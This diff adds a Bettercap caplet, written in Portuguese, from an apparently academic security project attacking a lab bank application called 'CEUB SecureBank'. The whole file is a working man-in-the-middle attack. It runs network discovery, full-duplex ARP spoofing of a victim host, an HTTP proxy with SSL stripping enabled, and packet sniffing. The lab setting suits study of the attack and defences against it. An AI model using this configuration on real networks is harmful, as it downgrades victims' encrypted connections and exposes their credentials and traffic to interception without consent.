@@ -1,0 +1,25 @@
+# Caplet do Bettercap para SSL Stripping e ARP Spoofing no CEUB SecureBank
+# Projeto: Exploração de Falhas Criptográficas via SSL Stripping
+# Autor: Alexsandro Patrício dos Santos Júnior
+
+# Descoberta de nós da rede local
+net.probe on
+
+# Configuração do ARP Spoofing contra a vítima
+set arp.spoof.targets 172.20.0.30
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+
+# Habilita o SSL Stripping no proxy HTTP
+set http.proxy.sslstrip true
+set http.proxy.port 8080
+set http.port 80
+
+# Inicia os módulos de ataque
+arp.spoof on
+http.proxy on
+net.sniff on
+
+# Limpa a tela e apresenta o status da operação
+clear
+events.stream
